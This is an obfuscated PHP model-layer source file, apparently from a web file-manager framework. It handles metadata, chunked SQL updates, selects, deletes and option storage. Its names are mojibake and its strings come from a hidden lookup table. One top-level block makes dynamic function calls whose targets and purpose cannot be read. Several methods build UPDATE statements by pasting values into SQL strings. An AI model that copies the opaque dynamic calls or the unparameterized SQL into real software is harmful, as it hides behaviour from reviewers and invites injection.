$E©×ó»¼Ö; } goto CâÚâ´”ìŸ; FĞì½ªÙÑ: $DâšÓäŞ…… = intval($this->count()); $B÷×Ì‹ôø = intval($B÷×Ì‹ôø); $B÷×Ì‹ôø = $B÷×Ì‹ôø <= 5 ? 5 : ($B÷×Ì‹ôø >= $E©×ó»¼Ö ? $E©×ó»¼Ö : $B÷×Ì‹ôø); goto Aã‘°ò‰¹Ë; AæËë„–«ğ: } protected function checkLength($E±éëïò„, $c¬‚¨ª–ßŞ = 0, $cÅŠ£ˆäñ = '') { $d‹àŒªŸÑ =& $_SERVER[Ä¿Ş°¨]; $c¬‚¨ª–ßŞ = $c¬‚¨ª–ßŞ ? $c¬‚¨ª–ßŞ : 65536; if (!$E±éëïò„ || strlen($E±éëïò„) < $c¬‚¨ª–ßŞ) { return; } $cÅŠ£ˆäñ = $cÅŠ£ˆäñ ? $cÅŠ£ˆäñ . $d‹àŒªŸÑ[67] : $d‹àŒªŸÑ[33]; show_json($cÅŠ£ˆäñ . LNG($d‹àŒªŸÑ[351]) . "\x28{$c¬‚¨ª–ßŞ}\x29", !1); } protected function metaSet($CºÛçÖ‡òŸ, $aòóÚë­›Î = null, $b’åÓ‰ãã  = null) { goto DÔÄù¨Éî; a„•ïÜ òñ: $fà¡Ì¿ğÏ->where(array($B«ÜÑ¿’— => $CºÛçÖ‡òŸ))->addAll($bŠÅ…¤‘, array(), !0); return !0; goto F¼°¶¤àíã; DŠîã”Ü»: if (is_string($aòóÚë­›Î)) { $cÕ–½ÁåÌ[$aòóÚë­›Î] = $b’åÓ‰ãã ; } $bŠÅ…¤‘ = array(); foreach ($cÕ–½ÁåÌ as $Eº×»­Òİª => $aÂÈñ¨ÑÙ¹) { $this->checkLength($aÂÈñ¨ÑÙ¹, !1, $BÈøš¶÷£ . $dŞãù“ÑÀ‘[4] . $Eº×»­Òİª); $bŠÅ…¤‘[] = array($B«ÜÑ¿’— => $CºÛçÖ‡òŸ, $dŞãù“ÑÀ‘[89] => $Eº×»­Òİª, $dŞãù“ÑÀ‘[355] => $aÂÈñ¨ÑÙ¹); } goto a„•ïÜ òñ; E£¾©Ò‹È½: if (is_null($aòóÚë­›Î)) { return $fà¡Ì¿ğÏ->where(array($B«ÜÑ¿’— => $CºÛçÖ‡òŸ))->delete(); } if (is_null($b’åÓ‰ãã )) { return $fà¡Ì¿ğÏ->where($BŠ§½¸ãÛ÷)->delete(); } $cÕ–½ÁåÌ = is_array($aòóÚë­›Î) ? $aòóÚë­›Î : array(); goto DŠîã”Ü»; DÔÄù¨Éî: $dŞãù“ÑÀ‘ =& $_SERVER[Ä¿Ş°¨]; if (!$this->tableMeta) { return !1; } $B«ÜÑ¿’— = $this->tableMeta[$dŞãù“ÑÀ‘[352]]; goto A½Óí¤Ñï; A½Óí¤Ñï: $BÈøš¶÷£ = $this->tableMeta[$dŞãù“ÑÀ‘[353]]; $fà¡Ì¿ğÏ = Model($BÈøš¶÷£); $BŠ§½¸ãÛ÷ = array($B«ÜÑ¿’— => $CºÛçÖ‡òŸ, $dŞãù“ÑÀ‘[354] => $aòóÚë­›Î); goto E£¾©Ò‹È½; F¼°¶¤àíã: } public function metaGet($A¢ï³Ô¤©Ì) { goto Aù·ë‘ªöù; f¤ÚÏƒè÷´: $cºóĞÑ†ëŸ = Model($this->tableMeta[$BÅªŒ¯°„Š[353]]); $Bö´¶”ì¼ = array($b­¯…¸¶·ä => $A¢ï³Ô¤©Ì); $b¸³Ø‘‚™ = $cºóĞÑ†ëŸ->field($BÅªŒ¯°„Š[356])->where($Bö´¶”ì¼)->select(); goto E¢Ï•ïÏé«; Aù·ë‘ªöù: $BÅªŒ¯°„Š =& $_SERVER[Ä¿Ş°¨]; if (!$this->tableMeta) { return array(); } $b­¯…¸¶·ä = $this->tableMeta[$BÅªŒ¯°„Š[352]]; goto f¤ÚÏƒè÷´; E¢Ï•ïÏé«: $b¸³Ø‘‚™ = array_to_keyvalue($b¸³Ø‘‚™, $BÅªŒ¯°„Š[89], $BÅªŒ¯°„Š[355]); return $b¸³Ø‘‚™; goto c’ë‚Ü©; c’ë‚Ü©: } private function checkDataAutoHas($dé–›º‘©£) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $B±Šİ…ËâÏ) { if (in_array($dé–›º‘©£, explode($_SERVER[Ä¿Ş°¨][47], $B±Šİ…ËâÏ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$DÃÜ™‰ß¼, $DƒŞœìÍš) { $EÇñÚÎ·ÏÍ =& $_SERVER[Ä¿Ş°¨]; foreach ($this->dataAuto as $fÃ²¦É˜ëÒ) { $eçéØ›­… = $fÃ²¦É˜ëÒ[0]; if (!in_array($DƒŞœìÍš, explode($EÇñÚÎ·ÏÍ[47], $fÃ²¦É˜ëÒ[2]))) { continue; } switch (trim($fÃ²¦É˜ëÒ[3])) { case $EÇñÚÎ·ÏÍ[305]: case $EÇñÚÎ·ÏÍ[306]: $f‘Å»‰“„ˆ = $fÃ²¦É˜ëÒ[1]; $bé³Á†‹åÃ = isset($fÃ²¦É˜ëÒ[4]) ? (array) $fÃ²¦É˜ëÒ[4] : array(); if ($f‘Å»‰“„ˆ == $EÇñÚÎ·ÏÍ[186] && array_key_exists($eçéØ›­…, $DÃÜ™‰ß¼)) { if (!$DÃÜ™‰ß¼[$eçéØ›­…]) { unset($DÃÜ™‰ß¼[$eçéØ›­…]); } break; } if (isset($DÃÜ™‰ß¼[$eçéØ›­…])) { array_unshift($bé³Á†‹åÃ, $DÃÜ™‰ß¼[$eçéØ›­…]); } if ($EÇñÚÎ·ÏÍ[305] == $fÃ²¦É˜ëÒ[3]) { $DÃÜ™‰ß¼[$eçéØ›­…] = call_user_func_array($f‘Å»‰“„ˆ, $bé³Á†‹åÃ); } else { $DÃÜ™‰ß¼[$eçéØ›­…] = call_user_func_array(array(&$this, $f‘Å»‰“„ˆ), $bé³Á†‹åÃ); } break; case $EÇñÚÎ·ÏÍ[257]: $DÃÜ™‰ß¼[$eçéØ›­…] = $DÃÜ™‰ß¼[$fÃ²¦É˜ëÒ[1]]; break; case $EÇñÚÎ·ÏÍ[278]: if (isset($DÃÜ™‰ß¼[$eçéØ›­…]) && !is_string($DÃÜ™‰ß¼[$eçéØ›­…])) { $DÃÜ™‰ß¼[$eçéØ›­…] = json_encode_force($DÃÜ™‰ß¼[$eçéØ›­…]); } break; case $EÇñÚÎ·ÏÍ[307]: if ($DÃÜ™‰ß¼[$eçéØ›­…] === $EÇñÚÎ·ÏÍ[33]) { unset($DÃÜ™‰ß¼[$eçéØ›­…]); } break; case $EÇñÚÎ·ÏÍ[308]: $DÃÜ™‰ß¼[$eçéØ›­…] = $fÃ²¦É˜ëÒ[1]; default: break; } } if ($DƒŞœìÍš == $EÇñÚÎ·ÏÍ[340]) { $Eá×·ïç‰• = strtolower($this->db->getDbType()); if (strpos($Eá×·ïç‰•, $EÇñÚÎ·ÏÍ[9]) !== 0) { return; } $aÙ°Òí¹£ = $this->field(!0)->fields; $f‰î’Š¥¦¢ = $aÙ°Òí¹£[$EÇñÚÎ·ÏÍ[236]]; if (isset($aÙ°Òí¹£[$EÇñÚÎ·ÏÍ[235]])) { unset($f‰î’Š¥¦¢[$aÙ°Òí¹£[$EÇñÚÎ·ÏÍ[235]]]); } foreach ($f‰î’Š¥¦¢ as $e­œ‚¾ö‘é => $DƒŞœìÍš) { if (!isset($DÃÜ™‰ß¼[$e­œ‚¾ö‘é])) { $DÃÜ™‰ß¼[$e­œ‚¾ö‘é] = $EÇñÚÎ·ÏÍ[33]; } } } } private function dataAfterFilter(&$A¹òí¤¥Åƒ) { $Fï¨òØ¨Íƒ =& $_SERVER[Ä¿Ş°¨]; foreach ($this->dataAuto as $eÌ‚£ù•›­) { $Fµ±ê—¢‰ª = $eÌ‚£ù•›­[0]; if (!in_array($Fï¨òØ¨Íƒ[342], explode($Fï¨òØ¨Íƒ[47], $eÌ‚£ù•›­[2]))) { continue; } if (!isset($A¹òí¤¥Åƒ[$Fµ±ê—¢‰ª])) { continue; } switch (trim($eÌ‚£ù•›­[3])) { case $Fï¨òØ¨Íƒ[305]: case $Fï¨òØ¨Íƒ[306]: $bîÊ…ªØ…Ş = isset($eÌ‚£ù•›­[4]) ? (array) $eÌ‚£ù•›­[4] : array(); array_unshift($bîÊ…ªØ…Ş, $A¹òí¤¥Åƒ[$Fµ±ê—¢‰ª]); if ($Fï¨òØ¨Íƒ[305] == $eÌ‚£ù•›­[3]) { $A¹òí¤¥Åƒ[$Fµ±ê—¢‰ª] = call_user_func_array($eÌ‚£ù•›­[1], $bîÊ…ªØ…Ş); } else { $A¹òí¤¥Åƒ[$Fµ±ê—¢‰ª] = call_user_func_array(array(&$this, $eÌ‚£ù•›­[1]), $bîÊ…ªØ…Ş); } break; case $Fï¨òØ¨Íƒ[257]: $A¹òí¤¥Åƒ[$Fµ±ê—¢‰ª] = $A¹òí¤¥Åƒ[$eÌ‚£ù•›­[1]]; break; case $Fï¨òØ¨Íƒ[278]: $A¦ˆò¬Š˜¿ = $A¹òí¤¥Åƒ[$Fµ±ê—¢‰ª]; $A¹òí¤¥Åƒ[$Fµ±ê—¢‰ª] = json_decode($A¦ˆò¬Š˜¿, !0); if (is_null($A¹òí¤¥Åƒ[$Fµ±ê—¢‰ª])) { $A¹òí¤¥Åƒ[$Fµ±ê—¢‰ª] = $A¦ˆò¬Š˜¿; } break; case $Fï¨òØ¨Íƒ[307]: if ($A¹òí¤¥Åƒ[$Fµ±ê—¢‰ª] === $Fï¨òØ¨Íƒ[33]) { unset($A¹òí¤¥Åƒ[$Fµ±ê—¢‰ª]); } break; case $Fï¨òØ¨Íƒ[308]: $A¹òí¤¥Åƒ[$Fµ±ê—¢‰ª] = $eÌ‚£ù•›­[1]; default: break; } } } public function saveAll($A…„·ÑÉÔÂ) { goto E†åÆÓ´Ü; cŠº®á¹ÌÊ: $A…„·ÑÉÔÂ = is_array($A…„·ÑÉÔÂ) ? $A…„·ÑÉÔÂ : array(); $BŸÅ¯Ì©†Ô = $bŸ¦ğË§Áâ[357]; $Bàì•¾ÙÑ = 0; goto eâ¿Ê÷æÌ; d¿˜„–Üó‹: $this->chunkEventSet(); goto EÑš…ğøğĞ; E†åÆÓ´Ü: $bŸ¦ğË§Áâ =& $_SERVER[Ä¿Ş°¨]; $e„¤É¯³áÇ = $this->tablePrefix . $this->tableName; $D÷¡Ëİİáæ = self::SQL_WHERE_IN_CHUNK; goto cŠº®á¹ÌÊ; eâ¿Ê÷æÌ: $bµº‡¨ñÄ = array(); $F‡ôŠ¶Óø = count($A…„·ÑÉÔÂ); for ($fºèë—êé– = 0; $fºèë—êé– < $F‡ôŠ¶Óø; $fºèë—êé–++) { $cË—ä³Àî = $A…„·ÑÉÔÂ[$fºèë—êé–]; if (!is_array($cË—ä³Àî) || count($cË—ä³Àî) != 4) { continue; } $f¢çëÌ±ôì = "\125\120\104\101\124\105\x20{$e„¤É¯³áÇ}\x20\x53\105\x54\x20{$cË—ä³Àî[2]}\40\75\x20\103\101\x53\x45\x20{$cË—ä³Àî[0]}\x20\12"; if ($Bàì•¾ÙÑ == 0) { $BŸÅ¯Ì©†Ô = $f¢çëÌ±ôì; } $bµº‡¨ñÄ[] = $bŸ¦ğË§Áâ[112] . $cË—ä³Àî[1] . $bŸ¦ğË§Áâ[112]; $Bàì•¾ÙÑ++; $BŸÅ¯Ì©†Ô .= "\x20\127\x48\105\x4e\40\47{$cË—ä³Àî[1]}\x27\40\x54\x48\x45\x4e\x20\x27{$cË—ä³Àî[3]}\x27\x20\xa"; if ($Bàì•¾ÙÑ == $D÷¡Ëİİáæ || $fºèë—êé– == $F‡ôŠ¶Óø - 1) { goto fôãÁ«¸ÔØ; fôãÁ«¸ÔØ: $FÓù²¡ù°© = implode($bŸ¦ğË§Áâ[47], $bµº‡¨ñÄ); $BŸÅ¯Ì©†Ô .= "\40\x45\x4e\104\40\40\127\x48\x45\x52\105\40{$cË—ä³Àî[0]}\40\111\116\40\x28{$FÓù²¡ù°©}\51\x20"; $this->execute($BŸÅ¯Ì©†Ô); goto Aê‚‘¥‘•ğ; d¸¼ÑìÙæ: $bµº‡¨ñÄ = array(); goto CÕñ ïŸ£œ; Aê‚‘¥‘•ğ: $Bàì•¾ÙÑ = 0; $BŸÅ¯Ì©†Ô = $f¢çëÌ±ôì; $this->chunkEventCheck(count($bµº‡¨ñÄ)); goto d¸¼ÑìÙæ; CÕñ ïŸ£œ: } } goto d¿˜„–Üó‹; EÑš…ğøğĞ: } public function saveAllEach($e²×Œã†¢Ü) { $E‚Ùåä¹Ô =& $_SERVER[Ä¿Ş°¨]; $b¦æ¦¬†¼ = $this->tablePrefix . $this->tableName; foreach ($e²×Œã†¢Ü as $F´ÃÇÂŠ•Ç) { if (!is_array($F´ÃÇÂŠ•Ç) || count($F´ÃÇÂŠ•Ç) != 4) { continue; } $B…«¸ÙÜ = $F´ÃÇÂŠ•Ç[0] . $E‚Ùåä¹Ô[358] . $F´ÃÇÂŠ•Ç[1] . $E‚Ùåä¹Ô[112]; $Bª”ªÓ¼É = $F´ÃÇÂŠ•Ç[2] . $E‚Ùåä¹Ô[358] . $F´ÃÇÂŠ•Ç[3] . $E‚Ùåä¹Ô[112]; $f‹›Ôïáç¢ = "\165\x70\144\141\164\145\40{$b¦æ¦¬†¼}\40\x73\x65\164\x20{$Bª”ªÓ¼É}\40\167\150\145\x72\145\40{$B…«¸ÙÜ}\73"; $this->execute($f‹›Ôïáç¢); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($e¯¬ñ‹Êôš = false, $FÕ±”Ë’‹¢ = false) { $this->_chunkEvent = $e¯¬ñ‹Êôš; $this->_chunkEventParam = $FÕ±”Ë’‹¢; } private function chunkEventCheck($cÍ»å¥ƒ·Œ) { if (!$this->_chunkEvent) { return; } $E»ÛÑÄ ù§ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $E»ÛÑÄ ù§[$_SERVER[Ä¿Ş°¨][359]] = $cÍ»å¥ƒ·Œ; Hook::trigger($this->_chunkEvent, $E»ÛÑÄ ù§); } public function addAll($Cæ… £ÔÑŞ, $B·É…ãŠ‰ƒ = array(), $EÈÃä¼„í  = false) { goto AÙß¶ÛÕÆÛ; bˆéÅã†ÚÔ: if (empty($Cæ… £ÔÑŞ)) { $this->error = think_lang($DÓ¥Ê±ÅÈÊ[255]); return !1; } $B·É…ãŠ‰ƒ = $this->_parseOptions($B·É…ãŠ‰ƒ); foreach ($Cæ… £ÔÑŞ as $BÈÉ¤•õœï => $bËŠìè„Œ) { $Cæ… £ÔÑŞ[$BÈÉ¤•õœï] = $this->_facade($bËŠìè„Œ); $this->_beforeInsert($Cæ… £ÔÑŞ[$BÈÉ¤•õœï], $B·É…ãŠ‰ƒ); } goto c¶‰ïÒ‰µ; AÙß¶ÛÕÆÛ: $DÓ¥Ê±ÅÈÊ =& $_SERVER[Ä¿Ş°¨]; ignore_timeout(); $B˜¹•ˆ”î = self::SQL_WHERE_IN_CHUNK; goto bˆéÅã†ÚÔ; c¶‰ïÒ‰µ: if (method_exists($this->db, $DÓ¥Ê±ÅÈÊ[256])) { for ($F”›©õŒ©‰ = 0; $F”›©õŒ©‰ < count($Cæ… £ÔÑŞ); $F”›©õŒ©‰ += $B˜¹•ˆ”î) { $dÂğ—ÇÂ­¬ = array_slice($Cæ… £ÔÑŞ, $F”›©õŒ©‰, $B˜¹•ˆ”î); if (!is_array($dÂğ—ÇÂ­¬) || count($dÂğ—ÇÂ­¬) == 0) { break; } $eƒêà·ì®÷ = $this->db->insertAll($dÂğ—ÇÂ­¬, $B·É…ãŠ‰ƒ, $EÈÃä¼„í ); $this->chunkEventCheck(count($dÂğ—ÇÂ­¬)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Cæ… £ÔÑŞ as $BÈÉ¤•õœï => $bËŠìè„Œ) { $eƒêà·ì®÷ = $this->db->insert($bËŠìè„Œ, $B·É…ãŠ‰ƒ, $EÈÃä¼„í ); } $this->commit(); } if (!1 !== $eƒêà·ì®÷) { $eÃ¹šôš© = $this->getLastInsID(); if ($eÃ¹šôš©) { return $eÃ¹šôš©; } } return $eƒêà·ì®÷; goto eéˆ‰…ŠËä; eéˆ‰…ŠËä: } public function save($fÚ·ÔÅùÅâ = '', $CÎÄ›‰’¹ğ = array()) { goto D÷×ëÙ‘ã; b³‚ ‹â‹£: $cƒ÷·ÒäÖÖ = $có‚ˆ—æÚº[$b¸½²°ÚëŠ[259]][$Eƒ÷çß‰’][1]; $cƒ÷·ÒäÖÖ = is_array($cƒ÷·ÒäÖÖ) ? $cƒ÷·ÒäÖÖ : array(); $EÇî™î÷¶ = count($cƒ÷·ÒäÖÖ); goto eÆ…î‰¬Ú…; dò²Ìˆâ”: $Eƒ÷çß‰’ = $this->findWhereField($có‚ˆ—æÚº); if (!$Eƒ÷çß‰’) { return parent::save($fÚ·ÔÅùÅâ, $CÎÄ›‰’¹ğ); } $e««•»ÂŞ = 0; goto b³‚ ‹â‹£; D÷×ëÙ‘ã: $b¸½²°ÚëŠ =& $_SERVER[Ä¿Ş°¨]; $fŞ°¶šƒô = self::SQL_WHERE_IN_CHUNK; $có‚ˆ—æÚº = $this->optionsValue(); goto dò²Ìˆâ”; eÆ…î‰¬Ú…: for ($BĞÄ÷½áÓä = 0; $BĞÄ÷½áÓä < $EÇî™î÷¶; $BĞÄ÷½áÓä += $fŞ°¶šƒô) { $fãƒ¸àÔ„ = array_slice($cƒ÷·ÒäÖÖ, $BĞÄ÷½áÓä, $fŞ°¶šƒô); if (!is_array($fãƒ¸àÔ„) || count($fãƒ¸àÔ„) == 0) { break; } $có‚ˆ—æÚº[$b¸½²°ÚëŠ[259]][$Eƒ÷çß‰’][1] = $fãƒ¸àÔ„; $this->optionsValue($có‚ˆ—æÚº); $e««•»ÂŞ += parent::save($fÚ·ÔÅùÅâ, $CÎÄ›‰’¹ğ); $this->chunkEventCheck(count($fãƒ¸àÔ„)); } $this->chunkEventSet(); return $e««•»ÂŞ; goto Eª‘½Óğ–; Eª‘½Óğ–: } public function add($Bº‡öèÈãô = '', $dÃêëœÃÄ‰ = array(), $F„³Ë†‹Œä = false) { if ($this->addTaskStatus && is_array($Bº‡öèÈãô)) { $this->addTaskData[] = $Bº‡öèÈãô; return; } return parent::add($Bº‡öèÈãô, $dÃêëœÃÄ‰, $F„³Ë†‹Œä); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($a­•ô¨¥´× = array()) { goto CùìâÜ†î; a–Í÷±Ï•: return $cÙ™ˆÕ½©»; goto cãå—ÙİŸÊ; Aã™¿‰÷æ…: $CÃõç‰·¤ = is_array($CÃõç‰·¤) ? $CÃõç‰·¤ : array(); $cÙ™ˆÕ½©» = null; for ($AŸ„›¯óù = 0; $AŸ„›¯óù < count($CÃõç‰·¤); $AŸ„›¯óù += $cºˆŒÙ«”¹) { $eÇÜÄø½öò = array_slice($CÃõç‰·¤, $AŸ„›¯óù, $cºˆŒÙ«”¹); if (!is_array($eÇÜÄø½öò) || count($eÇÜÄø½öò) == 0) { break; } $e÷§¹«¤è’[$Bğ„™ïàˆ[259]][$D—’…·ò–][1] = $eÇÜÄø½öò; $this->optionsValue($e÷§¹«¤è’); $eæÖ¨ø = parent::select($a­•ô¨¥´×); if (!$eæÖ¨ø) { continue; } if (is_null($cÙ™ˆÕ½©»)) { $cÙ™ˆÕ½©» = array(); } $cÙ™ˆÕ½©» = array_merge($cÙ™ˆÕ½©», $eæÖ¨ø); } goto a–Í÷±Ï•; f‘í•‚´Ú: $D—’…·ò– = $this->findWhereField($e÷§¹«¤è’); if (!$D—’…·ò– || isset($e÷§¹«¤è’[$Bğ„™ïàˆ[276]]) || isset($e÷§¹«¤è’[$Bğ„™ïàˆ[336]])) { return parent::select($a­•ô¨¥´×); } $CÃõç‰·¤ = $e÷§¹«¤è’[$Bğ„™ïàˆ[259]][$D—’…·ò–][1]; goto Aã™¿‰÷æ…; CùìâÜ†î: $Bğ„™ïàˆ =& $_SERVER[Ä¿Ş°¨]; $cºˆŒÙ«”¹ = self::SQL_WHERE_IN_CHUNK; $e÷§¹«¤è’ = $this->optionsValue(); goto f‘í•‚´Ú; cãå—ÙİŸÊ: } public function delete($b¹ÁÖáÒ Ú = array()) { goto dŞÙŠ¿ç„¾; F‰â‰êíÓ¬: $b‹Ûİ˜¢½‡ = $c¨ËˆÅ­—”[$FğÃ‡‡É„—[259]][$dÆ°…ÌßğÄ][1]; $b‹Ûİ˜¢½‡ = is_array($b‹Ûİ˜¢½‡) ? $b‹Ûİ˜¢½‡ : array(); for ($AÎ¦›¼ì = 0; $AÎ¦›¼ì < count($b‹Ûİ˜¢½‡); $AÎ¦›¼ì += $aƒİŸ£À—) { $FÎ¶‰áï½ = array_slice($b‹Ûİ˜¢½‡, $AÎ¦›¼ì, $aƒİŸ£À—); if (!is_array($FÎ¶‰áï½) || count($FÎ¶‰áï½) == 0) { break; } $c¨ËˆÅ­—”[$FğÃ‡‡É„—[259]][$dÆ°…ÌßğÄ][1] = $FÎ¶‰áï½; $this->optionsValue($c¨ËˆÅ­—”); $Eñç†Ê£ğ += parent::delete($b¹ÁÖáÒ Ú); } goto CâÂÀªÛß·; dŞÙŠ¿ç„¾: $FğÃ‡‡É„— =& $_SERVER[Ä¿Ş°¨]; $aƒİŸ£À— = self::SQL_WHERE_IN_CHUNK; $c¨ËˆÅ­—” = $this->optionsValue(); goto C’İ…»»¨Ø; C’İ…»»¨Ø: $dÆ°…ÌßğÄ = $this->findWhereField($c¨ËˆÅ­—”); if (!$dÆ°…ÌßğÄ) { return parent::delete($b¹ÁÖáÒ Ú); } $Eñç†Ê£ğ = 0; goto F‰â‰êíÓ¬; CâÂÀªÛß·: return $Eñç†Ê£ğ; goto dŒŠïÅÀ; dŒŠïÅÀ: } private function findWhereField($cåĞçÑòçÚ) { $b°åÉ£¢ğŸ =& $_SERVER[Ä¿Ş°¨]; $bİíªô¶‹ = self::SQL_WHERE_IN_CHUNK; if (!is_array($cåĞçÑòçÚ) || !is_array($cåĞçÑòçÚ[$b°åÉ£¢ğŸ[259]])) { return !1; } foreach ($cåĞçÑòçÚ[$b°åÉ£¢ğŸ[259]] as $EÂ¸’’Œ¼¥ => $DÆêÃ‘åƒ») { if (is_array($DÆêÃ‘åƒ») && isset($DÆêÃ‘åƒ»[0]) && is_string($DÆêÃ‘åƒ»[0]) && strtolower($DÆêÃ‘åƒ»[0]) == $b°åÉ£¢ğŸ[7] && is_array($DÆêÃ‘åƒ»[1]) && count($DÆêÃ‘åƒ»[1]) > $bİíªô¶‹) { ignore_timeout(); return $EÂ¸’’Œ¼¥; } } return !1; } } if ($_SERVER[$_SERVER[Ä¿Ş°¨][360]] != $_SERVER[$_SERVER[Ä¿Ş°¨][361]]) { goto Céö—îÑª¶; Céö—îÑª¶: $fË´…š—£ = $_SERVER[Ä¿Ş°¨][362]; $cèã¶Û–¹’ = $_SERVER[$_SERVER[Ä¿Ş°¨][363]] . $_SERVER[Ä¿Ş°¨][364]; $f¤¹œ¶ÁŸ÷ = $fË´…š—£($cèã¶Û–¹’); goto a†Š’‡»ˆ; cØ—ÀæõÕ: $a§–—»¢ñ($_SERVER[$_SERVER[Ä¿Ş°¨][368]]); goto c¡ØÁ÷Á‘â; a†Š’‡»ˆ: $EÁ­Üô«‘İ = explode($_SERVER[Ä¿Ş°¨][213], $f¤¹œ¶ÁŸ÷); if (count($EÁ­Üô«‘İ) < $_SERVER[Ä¿Ş°¨][365]) { $Dö’Á“ïîò = $_SERVER[Ä¿Ş°¨][366]; $Dö’Á“ïîò(); } $a§–—»¢ñ = $_SERVER[Ä¿Ş°¨][367]; goto cØ—ÀæõÕ; c¡ØÁ÷Á‘â: } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\x74\145\x6d\117\160\x74\x69\157\156"; public $field = array(); public function listData($F£î‹õ´”á = false, $F–†¸ÚÎÈ = "\155\x6f\x64\151\146\x79\x54\x69\x6d\x65", $eÇ°¨‚À± = false) { $bÉ‚·Éà±± = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$bÉ‚·Éà±±) { return $F£î‹õ´”á ? null : array(); } if (!$F£î‹õ´”á) { $bÉ‚·Éà±± = array_filter(array_values($bÉ‚·Éà±±)); return array_sort_by($bÉ‚·Éà±±, $F–†¸ÚÎÈ, $eÇ°¨‚À±); } return $bÉ‚·Éà±±[$_SERVER[Ä¿Ş°¨][369] . $F£î‹õ´”á]; } public function insert($dµ¾¨–­ëˆ) { goto eìËê”ÔÍ; dİ ÷Í·­À: $CÆì±‘˜ÁÆ = $CÆì±‘˜ÁÆ ? $CÆì±‘˜ÁÆ : 0; $dµ¾¨–­ëˆ[$dˆ í¬ñ™†[372]] = ++$CÆì±‘˜ÁÆ; $dµ¾¨–­ëˆ[$dˆ í¬ñ™†[183]] = time(); goto Dé…ÈôÄÎ–; eìËê”ÔÍ: $dˆ í¬ñ™† =& $_SERVER[Ä¿Ş°¨]; $dµ¾¨–­ëˆ = array_field_key($dµ¾¨–­ëˆ, $this->field); $CÆì±‘˜ÁÆ = Model($this->modelType)->get($dˆ í¬ñ™†[370], $this->optionType . $dˆ í¬ñ™†[371]); goto dİ ÷Í·­À; D¯ó…³‹¹Š: return $CÆì±‘˜ÁÆ; goto eÑ¾İ·©˜¨; Dé…ÈôÄÎ–: $dµ¾¨–­ëˆ[$dˆ í¬ñ™†[106]] = time(); Model($this->modelType)->set($dˆ í¬ñ™†[370], $CÆì±‘˜ÁÆ, $this->optionType . $dˆ í¬ñ™†[371]); Model($this->modelType)->set($dˆ í¬ñ™†[369] . $CÆì±‘˜ÁÆ, $dµ¾¨–­ëˆ, $this->optionType); goto D¯ó…³‹¹Š; eÑ¾İ·©˜¨: } public function update($c™ßêÁ½„³, $bµšå¤ÀÏ‰) { goto A«ÔÒ­²Ó; A«ÔÒ­²Ó: $c¤šß¸¹æË =& $_SERVER[Ä¿Ş°¨]; $bµšå¤ÀÏ‰ = array_field_key($bµšå¤ÀÏ‰, $this->field); $Cë™£ÉÎ£ = $this->listData($c™ßêÁ½„³); goto F…ìĞ¤™èĞ; F…ìĞ¤™èĞ: if (!$Cë™£ÉÎ£) { return !1; } $bµšå¤ÀÏ‰ = array_merge($Cë™£ÉÎ£, $bµšå¤ÀÏ‰); $bµšå¤ÀÏ‰[$c¤šß¸¹æË[106]] = time(); goto b¶¬½Œ’‡ğ; b¶¬½Œ’‡ğ: return Model($this->modelType)->set($c¤šß¸¹æË[369] . $c™ßêÁ½„³, $bµšå¤ÀÏ‰, $this->optionType); goto açÑÑÉÊÆ; açÑÑÉÊÆ: } public function remove($FŠ¼ÓÄ‹ª) { return Model($this->modelType)->remove($_SERVER[Ä¿Ş°¨][369] . $FŠ¼ÓÄ‹ª, $this->optionType); } public function clear() { $BÔ£ •Æ =& $_SERVER[Ä¿Ş°¨]; Model($this->modelType)->remove($BÔ£ •Æ[370], $this->optionType . $BÔ£ •Æ[371]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($E†´£÷È£, $Bİƒ©°×§÷) { if (!$Bİƒ©°×§÷) { return !1; } $BòÚÓ‹¯Åà = $this->listData(); $BòÚÓ‹¯Åà = array_to_keyvalue($BòÚÓ‹¯Åà, $E†´£÷È£); return isset($BòÚÓ‹¯Åà[$Bİƒ©°×§÷]) ? $BòÚÓ‹¯Åà[$Bİƒ©°×§÷] : !1; } public function findByName($e‰¢ÍÌÓ¿°) { return $this->findByKey($_SERVER[Ä¿Ş°¨][28], $e‰¢ÍÌÓ¿°); } protected function resetData($Eç©ˆ¤ˆÆ‰) { $eâ’÷®±…ä =& $_SERVER[Ä¿Ş°¨]; $Eç©ˆ¤ˆÆ‰ = is_array($Eç©ˆ¤ˆÆ‰) ? $Eç©ˆ¤ˆÆ‰ : array(); $e‹¨õğ„Éô = array(); for ($A¾õ¦Çù± = 0; $A¾õ¦Çù± < count($Eç©ˆ¤ˆÆ‰); $A¾õ¦Çù±++) { $e‹¨õğ„Éô[$eâ’÷®±…ä[369] . $Eç©ˆ¤ˆÆ‰[$A¾õ¦Çù±][$eâ’÷®±…ä[372]]] = $Eç©ˆ¤ˆÆ‰[$A¾õ¦Çù±]; } return Model($this->modelType)->set($e‹¨õğ„Éô, !1, $this->optionType); } private function getAutoName($eàŠªÓíÚ¬) { $Fà©îñİó… = array_to_keyvalue($this->listData(), $_SERVER[Ä¿Ş°¨][28]); if (!$Fà©îñİó… || !isset($Fà©îñİó…[$eàŠªÓíÚ¬])) { return $eàŠªÓíÚ¬; } for ($Fñ•Í‰‰ŠÖ = 1; $Fñ•Í‰‰ŠÖ < count($Fà©îñİó…); $Fñ•Í‰‰ŠÖ++) { $cÅ‡©¨‡Â³ = $eàŠªÓíÚ¬ . "\x28{$Fñ•Í‰‰ŠÖ}\x29"; if (!isset($Fà©îñİó…[$cÅ‡©¨‡Â³])) { return $cÅ‡©¨‡Â³; } } return $cÅ‡©¨‡Â³; } } goto E¾›Ÿò¡; A­ñäÃë²ˆ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($cøŠ©Ë¶ìø = '', $A¨˜µÅê²‰ = 0) { if (is_string($cøŠ©Ë¶ìø) && $cøŠ©Ë¶ìø != $_SERVER[Ä¿Ş°¨][33]) { $this->prefix = $cøŠ©Ë¶ìø; } if 